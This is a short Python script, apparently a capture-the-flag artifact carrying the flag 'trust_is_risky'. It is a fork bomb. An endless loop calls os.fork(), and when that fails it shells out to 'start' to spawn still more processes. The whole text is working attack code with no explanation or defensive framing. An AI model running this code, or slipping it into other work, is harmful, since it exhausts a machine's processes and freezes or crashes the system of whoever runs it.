import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
